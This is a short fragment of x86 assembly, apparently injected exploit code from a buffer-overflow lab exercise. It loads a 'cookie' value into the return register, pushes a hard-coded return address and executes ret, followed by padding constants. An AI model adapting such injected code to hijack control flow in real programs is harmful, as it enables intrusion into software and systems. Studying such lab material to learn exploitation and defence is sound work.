movl    $0x5516f6f3, %eax       # move cookie to eax (return value)
pushl   $0x8048f9e
ret
.align 4                # Following will be aligned on multiple of 4
.long   0xffffffff      # A 4-byte constant
.long   0x00000000      # Padding